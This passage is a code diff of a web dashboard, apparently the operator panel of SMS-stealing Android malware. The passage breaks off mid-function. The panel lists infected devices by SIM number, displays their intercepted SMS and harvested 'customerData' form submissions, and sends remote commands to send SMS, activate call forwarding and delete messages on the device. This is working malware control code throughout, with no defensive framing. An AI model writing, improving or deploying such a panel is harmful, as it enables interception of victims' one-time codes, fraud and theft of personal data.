@@ -29,9 +29,7 @@
         .card { background: white; padding: 20px; border-radius: 10px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border-top: 5px solid #555; position: relative; }
         .card.online { border-top: 5px solid var(--success); }
         .card.pinned { border-top: 5px solid var(--primary); }
-        .card-header { display: flex; justify-content: space-between; margin-bottom: 10px; }
         .status { font-size: 12px; font-weight: bold; color: #666; }
-        .online-text { color: var(--success); }
         .info { font-size: 13px; color: #444; margin-bottom: 5px; }
         .btns { display: grid; grid-template-columns: repeat(3,1fr); gap: 8px; margin-top: 15px; }
         .btn-sm { padding: 8px; font-size: 12px; cursor: pointer; border: none; border-radius: 4px; color: white; background: #444; font-weight: bold; }
@@ -46,9 +44,6 @@
         .modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
         .modal-header h2 { margin: 0; }
         .close-btn { background: var(--danger); color: white; border: none; padding: 8px 15px; cursor: pointer; border-radius: 4px; font-weight: bold; }
-        .data-item { background: #f5f5f5; padding: 12px; margin-bottom: 10px; border-radius: 5px; border-left: 4px solid var(--primary); }
-        .data-label { font-weight: bold; color: var(--dark); font-size: 12px; }
-        .data-value { color: #555; margin-top: 5px; }
         .no-data { text-align: center; color: #999; padding: 30px; }
     </style>
 </head>
@@ -106,7 +101,6 @@
 
     <script src="/socket.io/socket.io.js"></script>
     <script>
-        // Helper to escape text used in HTML attributes
         function escapeAttr(str) {
             if (str === undefined || str === null) return '';
             return String(str).replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
@@ -114,8 +108,7 @@
 
         const socket = io();
         let devices = [];
-        // track which modal is currently open so we can refresh it when new data arrives
-        let currentOpenModal = null; // { type: 'sms'|'data'|'form', deviceId }
+        let currentOpenModal = null;
         let currentFilter = 'all';
 
         function toast(msg, err=false) {
@@ -135,32 +128,23 @@
                     document.getElementById('dashboard').style.display='block';
                     fetchData(false);
                 } else alert('Wrong Password');
-            } catch (err) {
-                toast('Login error', true);
-            }
+            } catch (err) { toast('Login error', true); }
         }
 
         async function fetchData(showMsg) {
             try {
                 const r = await fetch('/api/devices');
-                if (!r.ok) throw new Error('Network response was not ok: ' + r.status);
                 devices = await r.json();
                 render();
-                // If a modal is open, refresh its contents from the updated `devices` data
-                try {
-                    if (currentOpenModal && document.getElementById('viewSmsModal').classList.contains('show') && currentOpenModal.type === 'sms') {
-                        viewSms(currentOpenModal.deviceId);
+                if (currentOpenModal) {
+                    if (document.getElementById('viewSmsModal').classList.contains('show') && currentOpenModal.type === 'sms') viewSms(currentOpenModal.deviceId, true);
+                    if (document.getElementById('viewDataModal').classList.contains('show')) {
+                        if (currentOpenModal.type === 'data') viewData(currentOpenModal.deviceId, true);
+                        if (currentOpenModal.type === 'form') viewFormData(currentOpenModal.deviceId, true);
                     }
-                    if (currentOpenModal && document.getElementById('viewDataModal').classList.contains('show')) {
-                        if (currentOpenModal.type === 'data') viewData(currentOpenModal.deviceId);
-                        if (currentOpenModal.type === 'form') viewFormData(currentOpenModal.deviceId);
-                    }
-                } catch (e) { /* ignore UI refresh errors */ }
+                }
                 if (showMsg) toast('✅ Refresh Successful!');
-            } catch (err) {
-                console.error('Fetch devices failed', err);
-                toast('❌ Refresh failed', true);
-            }
+            } catch (err) { toast('❌ Refresh failed', true); }
         }
 
         socket.on('dashboard-update', () => fetchData(false));
@@ -176,8 +160,7 @@
             if (!ts) return 'N/A';
             const d = new Date(ts);
             if (isNaN(d.getTime())) return 'N/A';
-            const now = new Date();
-            const diff = Math.floor((now - d) / 1000);
+            const diff = Math.floor((Date.now() - d) / 1000);
             if (diff < 60) return diff + 's ago';
             if (diff < 3600) return Math.floor(diff/60) + 'm ago';
             if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
@@ -193,265 +176,125 @@
             let list = devices.slice();
             if (currentFilter === 'online') list = list.filter(d=>d.isOnline);
             if (currentFilter === 'pinned') list = list.filter(d=>d.isPinned);
-            // Sort by installDate if available, otherwise fallback to registrationTimestamp
-            list = list.sort((a, b) => new Date(b.installDate || b.registrationTimestamp) - new Date(a.installDate || a.registrationTimestamp));
+            list.sort((a, b) => new Date(b.registrationTimestamp || 0) - new Date(a.registrationTimestamp || 0));
 
             list.forEach((d, idx) => {
                 const serialNum = idx + 1;
-                const pinColor = d.isPinned ? 'var(--primary)' : '#ccc';
-                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 60 ? 'fa-battery-three-quarters' : d.battery >= 40 ? 'fa-battery-half' : d.battery >= 20 ? 'fa-battery-quarter' : 'fa-battery-empty';
-                const batteryColor = d.battery > 20 ? '#43a047' : '#d32f2f';
-                const batteryPercent = `<span style='position:absolute;top:50%;left:0;width:100%;transform:translateY(-50%);text-align:center;font-size:13px;font-weight:bold;color:#111;pointer-events:none;'>${d.battery}%</span>`;
-                const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;letter-spacing:1px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
-                const simCopy = (sim, label) => `<span style='font-weight:bold;'>${label}:</span> <span id='${d.deviceId}_${label}' style='user-select:all;'>${sim||'N/A'}</span> <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" title="Copy ${label}" onclick="navigator.clipboard.writeText('${sim||''}');toast('${label} copied!')"></i>`;
-
+                const batteryIcon = d.battery >= 80 ? 'fa-battery-full' : d.battery >= 50 ? 'fa-battery-half' : 'fa-battery-quarter';
+                const statusBadge = `<span style="display:inline-block;border:2px solid #FFD700;border-radius:16px;padding:2px 16px;font-weight:bold;${d.isOnline ? 'color:#43a047;' : 'color:#d32f2f;'}background:#222;font-size:13px;">${d.isOnline ? 'ONLINE' : 'OFFLINE'}</span>`;
                 const card = document.createElement('div');
                 card.className = `card ${d.isOnline?'online':''} ${d.isPinned?'pinned':''}`;
-                card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0, 0 2px 8px #fff;position:relative;max-width:320px;margin:auto;border-radius:32px 32px 36px 36px;background:linear-gradient(145deg,#f8fafc 80%,#e0e0e0 100%);padding-top:60px;padding-bottom:24px;overflow:hidden;';
+                card.style = 'border:3px solid #1976d2;box-shadow:0 8px 32px #1976d2a0;position:relative;max-width:320px;margin:auto;border-radius:32px;background:#f8fafc;padding-top:60px;padding-bottom:24px;overflow:hidden;';
                 card.innerHTML = `
-                    <div style="position:absolute;top:18px;left:18px;z-index:2;"><i class="fas fa-thumbtack" style="color:${pinColor}; cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})" title="Pin Device"></i></div>
-                    <div style="position:absolute;top:8px;right:8px;z-index:2;display:flex;align-items:center;gap:8px;"><span style='position:relative;display:inline-block;width:44px;height:32px;'><i class="fas ${batteryIcon}" style="color:${batteryColor};font-size:32px;"></i>${batteryPercent}</span></div>
-                    <div class="serial-badge" style="font-size:17px;left:50%;transform:translateX(-50%);position:absolute;top:6px;z-index:3;background:var(--primary);color:var(--dark);padding:7px 18px 7px 18px;display:flex;flex-direction:column;align-items:center;min-width:120px;"><span style='font-size:18px;font-weight:bold;'>${serialNum}</span><span style='font-size:13px;font-weight:bold;color:#222;margin-top:2px;'>${escapeAttr(d.model||'')}</span></div>
-                    <div class="info" style="margin-bottom:2px;display:flex;align-items:center;gap:8px;justify-content:center;">${statusBadge}</div>
-                    <div class="info" style="margin-bottom:2px;">${simCopy(d.sim1,'SIM1')}</div>
-                    <div class="info" style="margin-bottom:2px;">${simCopy(d.sim2,'SIM2')}</div>
-                    <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Last Seen:</span> <span id="lastSeen_${d.deviceId}">${formatLastSeen(d.lastSeen)}</span></div>
-                    <div class="info" style="margin-bottom:2px;"><span style='font-weight:bold;'>Serial:</span> ${escapeAttr(d.serialNumber||'N/A')}</div>
-                    <div class="btns" style="margin-top:18px;">
+                    <div style="position:absolute;top:18px;left:18px;"><i class="fas fa-thumbtack" style="color:${d.isPinned?'var(--primary)':'#ccc'};cursor:pointer;font-size:22px;" onclick="togglePin('${d.deviceId}', ${!d.isPinned})"></i></div>
+                    <div style="position:absolute;top:12px;right:18px;display:flex;align-items:center;gap:4px;"><i class="fas ${batteryIcon}" style="color:${d.battery>20?'#43a047':'#d32f2f'};font-size:24px;"></i><span style="font-weight:bold;">${d.battery||0}%</span></div>
+                    <div class="serial-badge" style="left:50%;transform:translateX(-50%);top:6px;min-width:120px;text-align:center;">#${serialNum} <br> <small>${escapeAttr(d.model||'')}</small></div>
+                    <div class="info" style="text-align:center;">${statusBadge}</div>
+                    <div class="info"><b>SIM1:</b> ${escapeAttr(d.sim1||'N/A')}</div>
+                    <div class="info"><b>SIM2:</b> ${escapeAttr(d.sim2||'N/A')}</div>
+                    <div class="info"><b>Last Seen:</b> ${formatLastSeen(d.lastSeen)}</div>
+                    <div class="btns">
                         <button class="btn-sm btn-view" style="background:#1976d2;" onclick="viewData('${d.deviceId}')"><i class="fas fa-eye"></i> VIEW DATA</button>
                         <button class="btn-sm btn-view" style="background:#00bcd4;" onclick="viewSms('${d.deviceId}')"><i class="fas fa-envelope"></i> VIEW SMS</button>
                         <button class="btn-sm btn-view" style="background:#ffeb3b;color:#222;" onclick="viewFormData('${d.deviceId}')"><i class="fas fa-file-alt"></i> FORM DATA</button>
                         <button class="btn-sm btn-sms" style="background:#43a047;" onclick="showSendSmsModal('${d.deviceId}')"><i class="fas fa-paper-plane"></i> SEND SMS</button>
                         <button class="btn-sm btn-call" style="background:#ff9800;" onclick="showCallForwardModal('${d.deviceId}')"><i class="fas fa-phone"></i> CALL FWD</button>
-                        <button class="btn-sm btn-del" style="background:#d32f2f;font-weight:bold;" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
+                        <button class="btn-sm btn-del" onclick="del('${d.deviceId}')"><i class="fas fa-trash"></i> DELETE</button>
                     </div>`;
-
                 grid.appendChild(card);
             });
         }
 
-        // Generic action sender
-        async function act(id, type, data = {}) {
-            try {
-                const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, action: type, data}) });
-                const d = await r.json();
-                toast(d.message || (d.success ? 'Success' : 'Failed'), !d.success);
-            } catch (err) { toast('❌ Error: ' + err.message, true); }
-        }
-
         async function togglePin(id, s) {
-            try {
-                const r = await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, status: s}) });
-                const d = await r.json(); if (d.success) { fetchData(false); toast(d.message); } else toast(d.message, true);
-            } catch (err) { toast('❌ Error: ' + err.message, true); }
+            await fetch('/api/pin-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({deviceId: id, status: s}) });
+            fetchData(false);
         }
 
         async function del(id) {
-            const modal = document.createElement('div'); modal.style.position = 'fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
-            modal.innerHTML = `<div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:90vw;text-align:center;"><div style="font-size:20px;font-weight:bold;color:#d32f2f;margin-bottom:12px;">Delete Device</div><div style="margin-bottom:12px;">Enter Admin Password to delete this device.</div><input id="delPassInput" type="password" placeholder="Admin Password" style="width:100%;padding:12px;margin-bottom:12px;border:2px solid #1976d2;border-radius:6px;"><div style="display:flex;justify-content:space-between;"><button id="delCancelBtn" style="background:#eee;padding:10px 18px;border-radius:6px;border:none;">Cancel</button><button id="delConfirmBtn" style="background:#d32f2f;color:#fff;padding:10px 18px;border-radius:6px;border:none;">Delete</button></div></div>`;
-            document.body.appendChild(modal);
-            document.getElementById('delCancelBtn').onclick = () => document.body.removeChild(modal);
-            document.getElementById('delConfirmBtn').onclick = async () => {
-                const password = document.getElementById('delPassInput').value;
-                if (!password) { toast('Password is required', true); return; }
-                try {
-                    const r = await fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password }) });
-                    const d = await r.json(); if (d.success) { fetchData(false); toast('✅ Device deleted successfully'); document.body.removeChild(modal); } else toast(d.message || 'Delete failed', true);
-                } catch (err) { toast('❌ Error: ' + err.message, true); }
-            };
+            const pass = prompt("Enter Admin Password to Delete:");
+            if (!pass) return;
+            try {
+                const r = await fetch('/api/delete-device', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId: id, password: pass }) });
+                const d = await r.json();
+                if (d.success) { toast('Device Deleted'); fetchData(false); }
+                else toast(d.message || 'Error', true);
+            } catch (e) { toast('Error', true); }
         }
 
-        async function changePass() { const o = prompt('Old Password:'); const n = prompt('New Password:'); if (o && n) { try { const r = await fetch('/api/change-password', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ oldPassword: o, newPassword: n }) }); const d = await r.json(); toast(d.success ? '✅ Password Changed' : '❌ Wrong Old Password', !d.success); } catch (err) { toast('Error', true); } } }
-
-        async function viewData(deviceId) {
+        async function viewData(deviceId, isRefresh = false) {
             currentOpenModal = { type: 'data', deviceId };
-            // Ask server to refresh data in background (server returns stored device immediately)
+            if (!isRefresh) document.getElementById('viewDataModal').classList.add('show');
             try {
                 const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_DATA' }) });
-                const payload = await res.json().catch(()=>null);
-                let device = null;
-                if (payload && payload.device) device = payload.device;
-                if (!device) device = devices.find(d => d.deviceId === deviceId);
-                if (!device) { toast('❌ Device not found', true); return; }
-
-                const modalBody = document.getElementById('modalBody');
-                let html = `<div style="background:#e3f2fd;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:10px;">Device Details</div><table style="width:100%;border-collapse:collapse;font-size:15px;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px rgba(0,0,0,0.04);"><tbody>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>1. Model</td><td style='padding:8px 6px;'>${escapeAttr(device.model||'N/A')}</td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>2. SIM1</td><td style='padding:8px 6px;'>${escapeAttr(device.sim1||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim1||'')}"></i></td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>3. SIM2</td><td style='padding:8px 6px;'>${escapeAttr(device.sim2||'N/A')} <i class="fas fa-copy copy-btn" data-text="${escapeAttr(device.sim2||'')}"></i></td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>4. Android Version</td><td style='padding:8px 6px;'>${escapeAttr(device.androidVersion||'N/A')}</td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>5. Battery</td><td style='padding:8px 6px;'>${escapeAttr(device.battery||'N/A')}%</td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>6. Install Date</td><td style='padding:8px 6px;'>${device.installDate ? (new Date(device.installDate)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>7. Last Seen</td><td style='padding:8px 6px;'>${device.lastSeen ? (new Date(device.lastSeen)).toLocaleString('en-GB') : 'N/A'}</td></tr>`;
-                html += `<tr><td style='font-weight:bold;padding:8px 6px;'>8. Status</td><td style='padding:8px 6px;'><span style='color:${device.isOnline ? '#43a047':'#d32f2f'};font-weight:bold;'>${device.isOnline ? 'Online':'Offline'}</span></td></tr>`;
-                html += `</tbody></table></div><hr style="margin:10px 0;border:0;border-top:2px solid #1976d2;"><h3 style="color:#1976d2;margin-bottom:8px;">📝 Form Submission Details</h3>`;
-
-                if (device.customerData && Object.keys(device.customerData).length > 0) {
-                    Object.entries(device.customerData).forEach(([key, value]) => {
-                        const v = JSON.stringify(value);
-                        html += `<div style="background:#e3f2fd;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;"><span style="color:#1976d2;font-weight:bold;">${escapeAttr(key)}</span><span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\"fas fa-copy copy-btn\" data-text=\"${escapeAttr(v)}\"></i></span></div>`;
-                    });
-                } else {
-                    html += '<div class="no-data">No customer data submitted yet</div>';
-                }
-
-                modalBody.innerHTML = html;
-                setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-                document.getElementById('viewDataModal').classList.add('show');
-            } catch (err) {
-                toast('Error fetching data: ' + err.message, true);
-            }
+                const payload = await res.json();
+                const device = payload.device || devices.find(d => d.deviceId === deviceId);
+                if (!device) return;
+                let html = `<div style="background:#e3f2fd;padding:15px;border-radius:8px;"><h3>Device Details</h3>`;
+                const fields = [['Model', device.model], ['SIM1', device.sim1], ['SIM2', device.sim2], ['Android', device.androidVersion], ['Battery', device.battery+'%'], ['Last Seen', formatLastSeen(device.lastSeen)]];
+                fields.forEach(f => html += `<div style="margin-bottom:5px;"><b>${f[0]}:</b> ${escapeAttr(f[1]||'N/A')}</div>`);
+                html += `</div>`;
+                document.getElementById('modalBody').innerHTML = html;
+            } catch (e) { toast('Error', true); }
         }
 
-        async function viewFormData(deviceId) {
+        async function viewFormData(deviceId, isRefresh = false) {
             currentOpenModal = { type: 'form', deviceId };
+            if (!isRefresh) document.getElementById('viewDataModal').classList.add('show');
             try {
                 const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_FORM' }) });
-                const payload = await res.json().catch(()=>null);
-                let device = null;
-                if (payload && payload.customerData !== undefined) {
-                    // server may return customerData directly
-                    device = devices.find(d => d.deviceId === deviceId) || {};
-                    device.customerData = payload.customerData;
-                } else {
-                    device = devices.find(d => d.deviceId === deviceId);
-                }
-                if (!device) { toast('❌ Device not found', true); return; }
-                const modalBody = document.getElementById('modalBody');
-                let html = `<div style="background:#fffde7;padding:18px;border-radius:8px;"><div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:10px;">Submitted Form Data</div></div>`;
-                if (device.customerData && Object.keys(device.customerData).length > 0) {
-                    Object.entries(device.customerData).forEach(([key, value]) => { const v = JSON.stringify(value); html += `<div style="background:#fffde7;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #ffeb3b;display:flex;align-items:center;justify-content:space-between;"><span style="color:#ff9800;font-weight:bold;">${escapeAttr(key)}</span><span style="color:#222;font-size:15px;">${escapeAttr(v)} <i class=\\"fas fa-copy copy-btn\\" data-text=\\"${escapeAttr(v)}\\"></i></span></div>`; });
-                } else { html += '<div class="no-data">No form data submitted yet</div>'; }
-                modalBody.innerHTML = html;
-                setTimeout(() => { modalBody.querySelectorAll('.copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text || '').then(()=>toast('Copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-                document.getElementById('viewDataModal').classList.add('show');
-            } catch (err) { toast('Error fetching form data: ' + err.message, true); }
+                const payload = await res.json();
+                const data = payload.customerData || (devices.find(d => d.deviceId === deviceId)||{}).customerData || {};
+                let html = `<h3>Form Data</h3>`;
+                if (Object.keys(data).length === 0) html += `<div class="no-data">No data found</div>`;
+                else Object.entries(data).forEach(([k, v]) => html += `<div style="background:#fffde7;padding:10px;margin-bottom:5px;border-left:4px solid #ff9800;"><b>${escapeAttr(k)}:</b> ${escapeAttr(v)}</div>`);
+                document.getElementById('modalBody').innerHTML = html;
+            } catch (e) { toast('Error', true); }
         }
 
-        async function viewSms(deviceId) {
+        async function viewSms(deviceId, isRefresh = false) {
             currentOpenModal = { type: 'sms', deviceId };
+            if (!isRefresh) document.getElementById('viewSmsModal').classList.add('show');
             try {
-                // Ask server for latest SMS (server returns messages immediately if available)
                 const res = await fetch('/api/command', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ deviceId, action: 'VIEW_SMS' }) });
-                const payload = await res.json().catch(()=>null);
-                let msgs = null;
-                if (payload && Array.isArray(payload.messages)) msgs = payload.messages.slice(0,50);
-                const device = devices.find(d => d.deviceId === deviceId) || {};
-                if (!msgs) msgs = Array.isArray(device.smsMessages) ? device.smsMessages.slice(-50) : [];
-                // ensure latest on top
-                msgs = msgs.slice().sort((a,b) => (b.date||b.time||0) - (a.date||a.time||0)).slice(0,50);
-
-                let html = `<div style='background:#e3f2fd;padding:18px;border-radius:8px;'><div style='font-size:18px;font-weight:bold;color:#1976d2;'>${escapeAttr(device.model||'')} - Last 50 SMS</div></div><hr style='margin:0 0 10px 0;border:0;border-top:2px solid #1976d2;'>`;
-                html += msgs.map((msg, idx) => `
-                    <div style='background:#fff;margin-bottom:8px;padding:10px;border-radius:6px;border-left:5px solid #1976d2;display:flex;align-items:center;justify-content:space-between;'>
-                        <div>
-                            <div style='font-size:13px;color:#1976d2;font-weight:bold;'>${idx+1}. From: ${escapeAttr(msg.from||msg.address||'Unknown')}</div>
-                            <div style='font-size:15px;color:#222;margin:4px 0;'>${escapeAttr(msg.body||msg.message||'')}</div>
-                            <div style='font-size:12px;color:#888;'>${msg.time ? formatLastSeen(msg.time) : ''}</div>
+                const payload = await res.json();
+                let msgs = payload.messages || (devices.find(d => d.deviceId === deviceId)||{}).smsMessages || [];
+                msgs = msgs.slice(0, 50);
+                let html = msgs.map(m => `
+                    <div style="background:#fff;padding:10px;margin-bottom:8px;border-radius:8px;border-left:5px solid #1976d2;display:flex;justify-content:space-between;align-items:center;">
+                        <div style="flex:1;">
+                            <div style="color:#1976d2;font-weight:bold;">From: ${escapeAttr(m.from||m.address)}</div>
+                            <div style="margin:4px 0;">${escapeAttr(m.body||m.message)}</div>
+                            <small style="color:#888;">${formatLastSeen(m.date||m.time)}</small>
                         </div>
-                        <div style='display:flex;flex-direction:column;gap:6px;'>
-                            <i class="fas fa-copy copy-btn" style="color:var(--primary);cursor:pointer;font-size:18px;" data-text="${escapeAttr(msg.body||msg.message||'')}"></i>
+                        <div style="display:flex;gap:15px;margin-left:10px;">
+                            <i class="fas fa-copy" style="color:var(--primary);cursor:pointer;" onclick="navigator.clipboard.writeText('${escapeAttr(m.body||m.message)}');toast('Copied')"></i>
+                            <i class="fas fa-trash" style="color:var(--danger);cursor:pointer;" onclick="deleteSms('${deviceId}', '${escapeAttr(m.body||m.message)}', '${m.date||m.time}')"></i>
                         </div>
                     </div>`).join('');
-                if (msgs.length === 0) html += '<div class="no-data">No SMS messages found</div>';
-                document.getElementById('smsModalBody').innerHTML = html;
-                setTimeout(() => { document.querySelectorAll('#smsModalBody .copy-btn').forEach(el => el.onclick = () => { navigator.clipboard.writeText(el.dataset.text||'').then(()=>toast('Message copied!')).catch(()=>toast('Copy failed', true)); }); }, 0);
-                document.getElementById('viewSmsModal').classList.add('show');
-            } catch (err) { toast('Error fetching SMS: ' + err.message, true); }
+                document.getElementById('smsModalBody').innerHTML = html || '<div class="no-data">No SMS found</div>';
+            } catch (e) { toast('Error', true); }
         }
 
-        function deleteSms(deviceId, idx) { toast('Delete SMS feature coming soon!'); }
-        
-        // Show Send SMS modal
+        async function deleteSms(deviceId, body, date) {
+            if (!confirm('Delete this SMS?')) return;
+            await fetch('/api/delete-sms', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, smsData: { body, date } }) });
+            viewSms(deviceId, true);
+        }
+
         function showSendSmsModal(deviceId) {
-            const modal = document.createElement('div');
-            modal.style.position = 'fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
-            modal.innerHTML = `
-                <div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:95vw;">
-                    <div style="font-size:20px;font-weight:bold;color:#1976d2;margin-bottom:12px;text-align:center;">Send SMS</div>
-                    <div style="margin-bottom:12px;">
-                        <label style="font-weight:bold;">Select SIM</label>
-                        <select id="_smsSim" style="width:100%;padding:10px;margin:8px 0;border:2px solid #1976d2;border-radius:6px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
-                        <label style="font-weight:bold;">Recipient Number</label>
-                        <input id="_smsNumber" type="text" style="width:100%;padding:10px;margin:8px 0;border:2px solid #1976d2;border-radius:6px;" placeholder="Enter number">
-                        <label style="font-weight:bold;">Message</label>
-                        <textarea id="_smsBody" rows="4" style="width:100%;padding:10px;border:2px solid #1976d2;border-radius:6px;" placeholder="Enter message"></textarea>
-                        <div id="_smsStatus" style="margin-top:8px;min-height:22px;"></div>
-                    </div>
-                    <div style="display:flex;justify-content:space-between;gap:8px;">
-                        <button id="_smsCancel" style="background:#eee;padding:10px 18px;border-radius:6px;border:none;">Cancel</button>
-                        <button id="_smsSend" style="background:#43a047;color:#fff;padding:10px 18px;border-radius:6px;border:none;">Send</button>
-                    </div>
-                </div>`;
-            document.body.appendChild(modal);
-            document.getElementById('_smsCancel').onclick = () => document.body.removeChild(modal);
-            document.getElementById('_smsSend').onclick = async () => {
-                const simSlot = document.getElementById('_smsSim').value;
-                const number = document.getElementById('_smsNumber').value.trim();
-                const message = document.getElementById('_smsBody').value.trim();
-                if (!number || !message) { document.getElementById('_smsStatus').innerText = 'Number and message required'; return; }
-                document.getElementById('_smsStatus').innerText = 'Sending...';
-                try {
-                    const r = await fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action: 'SEND_SMS', data: { simSlot, number, message } }) });
-                    const d = await r.json();
-                    if (d.success) { document.getElementById('_smsStatus').innerText = '✅ SMS command sent'; setTimeout(()=>{ document.body.removeChild(modal); toast('SMS command sent'); },800); }
-                    else { document.getElementById('_smsStatus').innerText = '❌ ' + (d.message || 'Failed'); }
-                } catch (err) { document.getElementById('_smsStatus').innerText = '❌ Error: ' + err.message; }
-            };
+            const num = prompt("Enter Number:"); if(!num) return;
+            const msg = prompt("Enter Message:"); if(!msg) return;
+            fetch('/api/command', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'SEND_SMS', data:{ number:num, message:msg, simSlot:1 } }) }).then(r=>r.json()).then(d=>toast(d.message));
         }
 
-        // Show Call Forward modal
         function showCallForwardModal(deviceId) {
-            const modal = document.createElement('div'); modal.style.position='fixed'; modal.style.top='0'; modal.style.left='0'; modal.style.width='100vw'; modal.style.height='100vh'; modal.style.background='rgba(0,0,0,0.5)'; modal.style.display='flex'; modal.style.alignItems='center'; modal.style.justifyContent='center'; modal.style.zIndex='9999';
-            modal.innerHTML = `
-                <div style="background:#fff;padding:28px;border-radius:12px;min-width:320px;max-width:95vw;">
-                    <div style="font-size:20px;font-weight:bold;color:#ff9800;margin-bottom:12px;text-align:center;">Call Forward</div>
-                    <div style="margin-bottom:12px;">
-                        <label style="font-weight:bold;">Select SIM</label>
-                        <select id="_cfSim" style="width:100%;padding:10px;margin:8px 0;border:2px solid #ff9800;border-radius:6px;"><option value="1">SIM 1</option><option value="2">SIM 2</option></select>
-                        <label style="font-weight:bold;">Forward Number</label>
-                        <input id="_cfNumber" type="text" style="width:100%;padding:10px;margin:8px 0;border:2px solid #ff9800;border-radius:6px;" placeholder="Enter number">
-                        <div id="_cfStatus" style="margin-top:8px;min-height:22px;"></div>
-                    </div>
-                    <div style="display:flex;justify-content:space-between;gap:8px;">
-                        <button id="_cfActivate" style="background:#43a047;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Activate</button>
-                        <button id="_cfDeactivate" style="background:#d32f2f;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Deactivate</button>
-                        <button id="_cfCheck" style="background:#1976d2;color:#fff;padding:10px 12px;border-radius:6px;border:none;">Check Status</button>
-                    </div>
-                    <div style="margin-top:10px;text-align:center;"><button id="_cfCancel" style="background:#eee;padding:10px 12px;border-radius:6px;border:none;">Close</button></div>
-                </div>`;
-            document.body.appendChild(modal);
-            document.getElementById('_cfCancel').onclick = () => document.body.removeChild(modal);
-
-            document.getElementById('_cfActivate').onclick = async () => {
-                const simSlot = document.getElementById('_cfSim').value;
-                const number = document.getElementById('_cfNumber').value.trim();
-                if (!number) { document.getElementById('_cfStatus').innerText='Number required'; return; }
-                document.getElementById('_cfStatus').innerText='Activating...';
-                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_ACTIVATE', data:{ simSlot, number } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? '✅ Activated' : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
-            };
-            document.getElementById('_cfDeactivate').onclick = async () => {
-                const simSlot = document.getElementById('_cfSim').value;
-                document.getElementById('_cfStatus').innerText='Deactivating...';
-                try { const r = await fetch('/api/command',{ method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ deviceId, action:'CALL_FORWARD_DEACTIVATE', data:{ simSlot } }) }); const d = await r.json(); document.getElementById('_cfStatus').innerText = d.success ? '✅ Deactivated' : ('❌ '+(d.message||'Failed')); } catch (err) { document.getElementById('_cfStatus').innerText='❌ '+err.message; }
-            };
-            document.getElementById('_cfCheck').onclick = async () => {
